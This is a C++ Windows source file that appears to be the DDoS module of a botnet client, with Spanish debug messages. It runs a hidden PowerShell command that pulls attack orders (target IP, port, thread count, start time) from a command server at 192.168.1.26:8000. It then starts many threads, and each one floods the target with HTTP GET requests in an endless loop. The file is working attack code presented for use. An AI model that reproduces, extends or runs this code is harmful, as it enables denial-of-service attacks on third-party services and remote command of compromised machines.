#include "pch.h"
#include "resource.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <CommCtrl.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <cpr/cpr.h>
#include <ctime>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <thread>
#include <filesystem>
#include <cstdio>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <regex>
#include "utils.h"

#include <nlohmann/json.hpp>
using json = nlohmann::json;

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "comctl32.lib")


void make_request(const std::string& ip, int port, const std::string& resource) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation error" << std::endl;
            continue;
        }

        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);

        if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {
            std::cerr << "Invalid address/ Address not supported" << std::endl;
            closesocket(sock);
            continue;
        }

        if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            std::cerr << "Connection Failed" << std::endl;
            closesocket(sock);
            continue;
        }

        std::string request = "GET " + resource + " HTTP/1.1\r\nHost: " + ip + "\r\n\r\n";
        send(sock, request.c_str(), request.length(), 0);

        closesocket(sock);
    }

    WSACleanup();
}

void executeDDoS() {

    std::string currentDateTime = getCurrentDateTime();

    std::string output;
    const char* cmd2 = "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://192.168.1.26:8000/ddos-attacks/' -UseBasicParsing | Select-Object -ExpandProperty Content\"";
    ExecuteCommandHidden(cmd2, output);
    //MessageBoxA(NULL, output.c_str(), "Output", MB_ICONINFORMATION);

    auto jsonArray = json::parse(output);

    if (jsonArray.empty()) {
        std::cerr << "El array JSON está vacío" << std::endl;
        MessageBoxA(NULL, "Array vacio!", "Output", MB_ICONINFORMATION);
        return;
    }

    auto firstElement = jsonArray.at(0);

    std::string ip = firstElement["ip"].get<std::string>();
    int port = firstElement["port"].get<int>();
    int threads = firstElement["threads"].get<int>();
    std::string scheduled_time = firstElement["scheduled_time"].get<std::string>();

    std::string firstElementStr = firstElement.dump();
    //MessageBoxA(NULL, firstElementStr.c_str(), "Output", MB_ICONINFORMATION);

    if (output.empty()) {
        MessageBoxA(NULL, "NO HAY DDOS!!", "Output", MB_ICONINFORMATION);
        return;
    }

    std::string resource = "/docs";

    MessageBoxA(NULL, "HE ENTRADO!!", "Output", MB_ICONINFORMATION);
    MessageBoxA(NULL, currentDateTime.c_str(), "Output", MB_ICONINFORMATION);
    MessageBoxA(NULL, scheduled_time.c_str(), "Output", MB_ICONINFORMATION);
    std::vector<std::thread> thread_pool;
    if (currentDateTime == scheduled_time) {
        

        for (int i = 0; i < threads; ++i) {
            thread_pool.emplace_back(std::thread(make_request, ip, port, resource));
        }

        for (auto& th : thread_pool) {
            if (th.joinable()) {
                th.join();
            }
        }
    }
    // std::this_thread::sleep_for(std::chrono::seconds(1));
}

